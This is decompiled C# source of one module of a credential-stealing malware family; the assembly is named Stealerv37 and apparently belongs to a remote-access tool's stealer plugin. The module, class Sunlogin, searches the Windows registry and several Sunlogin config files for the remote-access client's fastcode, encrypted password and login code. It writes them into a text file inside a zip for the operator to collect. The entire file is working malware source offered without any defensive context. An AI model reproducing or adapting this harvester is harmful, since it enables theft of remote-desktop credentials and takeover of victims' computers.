// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Applications.Sunlogin
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using Microsoft.Win32;
using System;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;

#nullable disable
namespace Intelix.Targets.Applications;

public class Sunlogin : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    string name1 = "SOFTWARE\\\\WOW6432Node\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\Oray SunLogin RemoteClient";
    string name2 = ".DEFAULT\\\\Software\\\\Oray\\\\SunLogin\\\\SunloginClient\\\\SunloginGreenInfo";
    string name3 = ".DEFAULT\\\\Software\\\\Oray\\\\SunLogin\\\\SunloginClient\\\\SunloginInfo";
    StringBuilder sb = new StringBuilder();
    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
    counterApplications.Name = nameof (Sunlogin);
    RegistryKey registryKey1 = Registry.LocalMachine.OpenSubKey(name1);
    RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey(name2);
    RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey(name3);
    if (registryKey1 != null)
    {
      string str = Path.Combine(Registry.LocalMachine.OpenSubKey(name1).GetValue("InstallLocation").ToString(), "config.ini");
      string input = File.Exists(str) ? File.ReadAllText(str) : string.Empty;
      string empty1 = string.Empty;
      string empty2 = string.Empty;
      string empty3 = string.Empty;
      if (!string.IsNullOrEmpty(input))
      {
        empty1 = Regex.Match(input, "fastcode=(.*)", RegexOptions.Multiline).Groups[1].Value;
        empty2 = Regex.Match(input, "encry_pwd=(.*)", RegexOptions.Multiline).Groups[1].Value;
        empty3 = Regex.Match(input, "sunlogincode=(.*)", RegexOptions.Multiline).Groups[1].Value;
      }
      AppendFound("registry_install", str, empty1, empty2, empty3);
    }
    else if (registryKey2 != null)
    {
      string text4 = Registry.LocalMachine.OpenSubKey(name2).GetValue("base_fastcode").ToString();
      string text5 = Registry.LocalMachine.OpenSubKey(name2).GetValue("base_encry_pwd").ToString();
      string text6 = Registry.LocalMachine.OpenSubKey(name2).GetValue("base_sunlogincode").ToString();
      AppendFound("registry_greeninfo", string.Empty, text4, text5, text6);
    }
    else if (registryKey3 != null)
    {
      string text4 = Registry.LocalMachine.OpenSubKey(name3).GetValue("base_fastcode").ToString();
      string text5 = Registry.LocalMachine.OpenSubKey(name3).GetValue("base_encry_pwd").ToString();
      string text6 = Registry.LocalMachine.OpenSubKey(name3).GetValue("base_sunlogincode").ToString();
      AppendFound("registry_info", string.Empty, text4, text5, text6);
    }
    string str1 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Oray", "SunloginClient", "config.ini");
    if (File.Exists(str1))
    {
      string input = File.ReadAllText(str1);
      string text4 = Regex.Match(input, "fastcode=(.*)", RegexOptions.Multiline).Groups[1].Value;
      string text5 = Regex.Match(input, "encry_pwd=(.*)", RegexOptions.Multiline).Groups[1].Value;
      string text6 = Regex.Match(input, "sunlogincode=(.*)", RegexOptions.Multiline).Groups[1].Value;
      AppendFound("programdata", str1, text4, text5, text6);
    }
    string str2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Oray", "SunloginClientLite", "sys_lite_config.ini");
    if (File.Exists(str2))
    {
      string input = File.ReadAllText(str2);
      string text4 = Regex.Match(input, "fastcode=(.*)", RegexOptions.Multiline).Groups[1].Value;
      string text5 = Regex.Match(input, "encry_pwd=(.*)", RegexOptions.Multiline).Groups[1].Value;
      string text6 = Regex.Match(input, "sunlogincode=(.*)", RegexOptions.Multiline).Groups[1].Value;
      AppendFound("user_roaming", str2, text4, text5, text6);
    }
    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 3) + "\\Windows\\system32\\config\\systemprofile\\AppData\\Roaming\\Oray\\SunloginClient\\sys_config.ini");
    string str3 = "C:\\\\Windows\\\\system32\\\\config\\\\systemprofile\\\\AppData\\\\Roaming\\\\Oray\\\\SunloginClient\\\\sys_config.ini";
    if (File.Exists(str3))
    {
      string input = File.ReadAllText(str3);
      string text4 = Regex.Match(input, "fastcode=(.*)", RegexOptions.Multiline).Groups[1].Value;
      string text5 = Regex.Match(input, "encry_pwd=(.*)", RegexOptions.Multiline).Groups[1].Value;
      string text6 = Regex.Match(input, "sunlogincode=(.*)", RegexOptions.Multiline).Groups[1].Value;
      AppendFound("systemprofile", str3, text4, text5, text6);
    }
    if (sb.Length <= 0)
      return;
    string entryPath = "Sunlogin\\info.txt";
    zip.AddTextFile(entryPath, sb.ToString());
    counterApplications.Files.Add(entryPath);
    counter.Applications.Add(counterApplications);

    void AppendFound(string source, string text3, string text4, string text5, string text6)
    {
      sb.AppendLine("Source: " + source);
      if (!string.IsNullOrEmpty(text3))
      {
        sb.AppendLine("Path: " + text3);
        counterApplications.Files.Add(text3 + " => Sunlogin\\info.txt");
      }
      sb.AppendLine("Fastcode: " + text4);
      sb.AppendLine("Encry_pwd: " + text5);
      sb.AppendLine("Sunlogincode: " + text6);
      sb.AppendLine();
    }
  }
}
